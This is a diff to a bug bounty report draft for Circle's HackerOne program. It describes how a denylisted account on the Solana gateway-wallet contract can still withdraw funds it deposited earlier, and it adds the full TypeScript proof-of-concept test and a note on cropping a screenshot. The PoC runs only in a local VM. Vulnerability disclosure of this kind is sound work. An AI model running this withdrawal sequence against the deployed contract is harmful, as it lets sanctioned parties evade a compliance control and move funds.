@@ -9,8 +9,16 @@ Before copying/pasting and submitting, check:
 - [ ] Evidence checked — the code excerpts and the PoC output below really exist/ran as described
 - [ ] Not a duplicate — checked against reports already submitted; also do a fresh search on the program page right before submitting (a live public program with real activity can get new duplicates fast — this session already lost a race on a different finding)
 - [ ] Screenshots attached — HackerOne needs these as separate file uploads on the submission form, not as pasted Markdown; the `![...]()` embeds below are for viewing this report locally/on GitHub, not for pasting into the report text box
+- [ ] **`01-poc-execution.png` re-cropped or retaken** (see below) — the current file shows my local machine's directory layout and WSL setup in the command line, which has no business going to Circle
 
 **Screenshots (2026-08-31):** 5 real screenshots, taken by you following the guide, verified here by actually looking at each one — all accurate, all legible, all matching the code/output already in this report. Files at `research/bugbounty/reports/screenshots/circle-bbp-solana-gateway-denylist-withdrawal/`, embedded inline below at their matching section. Suggested upload order on HackerOne: `01-poc-execution.png` first (it's the whole story in one image), then `02` through `05` in the order they appear in Evidence. `01` shows a third independent run (different tx signature again) — three separate live executions now, same deterministic result every time.
+
+**Problem with `01-poc-execution.png`, needs fixing before you send anything to Circle:** the top of that screenshot shows the actual command line — `wsl -d kali-linux -- bash -c "cd /mnt/e/dev-toolchains/solana-poc/solana-gateway-contracts && ..."`. That reveals my local folder structure and WSL distro name, which is irrelevant to Circle and not something an external report should expose (it's not a security issue, just unprofessional clutter — reads like an internal note leaked into a customer-facing document). I can't edit pixels in an existing image, so pick one:
+
+1. **Simplest — re-crop what you already have.** Open the PNG in Paint (or any editor) and crop off the top few lines, keeping only from `============================================================` (the first banner line) down through `1 passing`. Nothing about the command needs to be visible — the output alone tells the whole story.
+2. **Cleanest — retake it.** Open a new terminal, run the same command from the guide again, wait for it to finish, then before screenshotting, scroll the window up (or just drag the Win+Shift+S selection box) so it starts at the `PS ...>` prompt line is excluded — capture only from the first `====` line to `1 passing`.
+
+Either way, replace `research/bugbounty/reports/screenshots/circle-bbp-solana-gateway-denylist-withdrawal/01-poc-execution.png` with the fixed version before uploading anywhere.
 
 **Live-verified 2026-08-31:** `circlefin/solana-gateway-contracts`, type "Smart contract", **In scope**, max severity **Critical**, **Eligible**, on `hackerone.com/circle-bbp`.
 
@@ -160,6 +168,157 @@ pub fn is_account_denylisted<'info>(denylist_account: &UncheckedAccount<'info>) 
 ## Executable proof of concept
 Built the real `gateway-wallet` program from source (`cargo-build-sbf`, official Solana/Agave CLI, no reimplementation) and generated the real Anchor IDL (`anchor-cli` 0.31.1). Ran the test against the real compiled program using `litesvm` (an in-process Solana VM) via **the project's own real test helper class**, `GatewayWalletTestClient` from `tests/gateway-wallet/test_client.ts` — the exact same client the project's own `deposit.test.ts`/`withdrawal.test.ts`/`denylist.test.ts` use, not a custom reimplementation.
 
+### What is mine vs. what is the target's
+
+Two distinct pieces of code are involved, and it matters which is which:
+
+- **`tests/gateway-wallet/test_client.ts`** — part of `circlefin/solana-gateway-contracts` itself, written by the Circle Gateway team and already used by their own `deposit.test.ts`/`withdrawal.test.ts`/`denylist.test.ts`. I did not write or modify this file. It just wraps sending real instructions (`deposit`, `denylist`, `initiateWithdrawal`, `withdraw`, ...) to the compiled program and reading back real account state — it contains no logic related to the bug.
+- **`tests/gateway-wallet/poc_denylist_withdrawal_bypass.test.ts`** — a new file I added locally to drive that existing client through the specific sequence that demonstrates this bug. It is not part of the target repository and was never pushed anywhere; it only calls the target's own public test-client methods in a particular order and prints the results. Full source, unmodified except for the `console.log` wording (no assertion or program logic was changed for presentation):
+
+```typescript
+import { LiteSVM } from "litesvm";
+import { GatewayWalletTestClient } from "./test_client";
+import { expect } from "chai";
+import { Keypair } from "@solana/web3.js";
+
+const banner = () => console.log("=".repeat(60));
+
+describe("PoC: denylisted depositor can still withdraw pre-existing balance", () => {
+  it("withdrawal succeeds even though depositor was denylisted after depositing", async () => {
+    banner();
+    console.log("PoC: Denylisted account can withdraw pre-existing funds");
+    banner();
+    const svm = new LiteSVM();
+    const testClient = new GatewayWalletTestClient(svm);
+    await testClient.initialize({ localDomain: 5, withdrawalDelay: 1 });
+
+    const testTokenMint = await testClient.createTokenMint(
+      testClient.owner.publicKey,
+      6
+    );
+    await testClient.addToken({ tokenMint: testTokenMint });
+
+    const depositor = Keypair.generate();
+    svm.airdrop(depositor.publicKey, BigInt(1_000_000_000));
+
+    const userTokenAccount = await testClient.createTokenAccount(
+      testTokenMint,
+      depositor.publicKey
+    );
+    await testClient.mintToken(
+      testTokenMint,
+      userTokenAccount,
+      2_000_000,
+      testClient.owner
+    );
+    console.log("[1] Initial balance");
+    console.log(
+      "    Depositor token balance:",
+      (await testClient.getTokenAccountBalance(userTokenAccount)).toLocaleString()
+    );
+
+    // Depositor deposits BEFORE being denylisted.
+    await testClient.deposit(
+      {
+        tokenMint: testTokenMint,
+        amount: 1_000_000,
+        fromTokenAccount: userTokenAccount,
+      },
+      { owner: depositor }
+    );
+    console.log("[2] Deposit before denylist");
+    console.log("    Amount: 1,000,000");
+    console.log("    Result: SUCCESS");
+
+    // Denylist the depositor AFTER they already have funds in the program.
+    await testClient.denylist({ account: depositor.publicKey });
+    const denylistAccount = await testClient.getDenylistAccount(
+      depositor.publicKey
+    );
+    expect(denylistAccount, "denylist account should exist").to.not.be.null;
+    console.log("[3] Denylist depositor");
+    console.log("    Result: SUCCESS");
+
+    // Sanity check: a NEW deposit from the now-denylisted account IS correctly
+    // blocked -- confirms the denylist mechanism itself works, and that this
+    // account is genuinely denylisted from the program's own point of view.
+    let newDepositWasBlocked = false;
+    let newDepositError = "";
+    try {
+      await testClient.deposit(
+        {
+          tokenMint: testTokenMint,
+          amount: 1,
+          fromTokenAccount: userTokenAccount,
+        },
+        { owner: depositor }
+      );
+    } catch (err) {
+      newDepositWasBlocked = true;
+      newDepositError = String(err).includes("AccountDenylisted") ? "AccountDenylisted" : String(err).slice(0, 80);
+    }
+    console.log("[4] Attempt NEW deposit after denylist");
+    console.log("    Amount: 1");
+    console.log("    Result:", newDepositWasBlocked ? "REJECTED" : "ACCEPTED (unexpected)");
+    if (newDepositWasBlocked) console.log("    Error:", newDepositError);
+    expect(newDepositWasBlocked, "new deposit from denylisted account must be rejected")
+      .to.be.true;
+
+    // THE BUG: initiateWithdrawal + withdraw of the balance deposited BEFORE
+    // the denylist should also be blocked for a denylisted account, but the
+    // real program code (InitiateWithdrawalContext / WithdrawContext) never
+    // declares or checks a denylist account at all.
+    await testClient.initiateWithdrawal(
+      { tokenMint: testTokenMint, amount: 1_000_000 },
+      depositor
+    );
+    console.log("[5] Initiate withdrawal of pre-existing balance");
+    console.log("    Amount: 1,000,000");
+    console.log("    Result: SUCCESS");
+
+    const depositPDA = testClient.getDepositPDA(
+      testTokenMint,
+      depositor.publicKey
+    );
+    const depositAccount =
+      await testClient.gatewayWalletProgram.account.gatewayDeposit.fetch(
+        depositPDA.publicKey
+      );
+    svm.warpToSlot(BigInt(depositAccount.withdrawalBlock.toNumber() + 1));
+
+    const balanceBefore = await testClient.getTokenAccountBalance(
+      userTokenAccount
+    );
+
+    const txSig = await testClient.withdraw(
+      { tokenMint: testTokenMint, toTokenAccount: userTokenAccount },
+      depositor
+    );
+    console.log("[6] Complete withdrawal");
+    console.log("    Result: SUCCESS");
+
+    const balanceAfter = await testClient.getTokenAccountBalance(
+      userTokenAccount
+    );
+
+    banner();
+    console.log("RESULT");
+    banner();
+    console.log("Denylisted before withdrawal:", denylistAccount !== null ? "TRUE" : "FALSE");
+    console.log("Balance before withdrawal:   ", balanceBefore.toLocaleString());
+    console.log("Balance after withdrawal:    ", balanceAfter.toLocaleString());
+    console.log("Amount withdrawn:            ", (balanceAfter - balanceBefore).toLocaleString());
+    console.log("tx:                          ", txSig);
+    console.log("UNAUTHORIZED WITHDRAWAL ACCEPTED");
+    banner();
+
+    expect(balanceAfter).to.equal(balanceBefore + BigInt(1_000_000));
+  });
+});
+```
+
+Every call in this file (`deposit`, `denylist`, `initiateWithdrawal`, `withdraw`, balance reads) goes through `test_client.ts`'s existing methods, which in turn send real Anchor instructions to the real compiled program running inside `litesvm`. Nothing here simulates the vulnerable code path or asserts a made-up outcome — the two `expect()` calls are the only assertions, and both check real values read back from the program after real instructions executed.
+
 Test sequence:
 1. Initialize the program, add a token mint, mint 2,000,000 units to a fresh depositor's token account.
 2. Depositor deposits 1,000,000 units into `gateway-wallet` (normal `deposit` call, succeeds — not denylisted yet).
@@ -208,6 +367,8 @@ UNAUTHORIZED WITHDRAWAL ACCEPTED
 ```
 ![Executable PoC — denylisted account successfully withdraws its pre-existing balance](screenshots/circle-bbp-solana-gateway-denylist-withdrawal/01-poc-execution.png)
 *Executable PoC — denylisted account successfully withdraws its pre-existing balance. This is a separate live run from the literal text above (same command, run again from a plain PowerShell window) — different transaction signature (`4YFCbs5U...`) than the text block's `5fWLeusE...`, identical deterministic numbers. Two independent runs, same result.*
+
+**⚠️ Before uploading `01-poc-execution.png`, see the note in the checklist above — it currently shows the command line with a local path, which needs to be cropped or replaced before this goes to Circle.**
 
 ## Impact
 A denylisted account can retain and withdraw funds that were deposited before the denylist action.
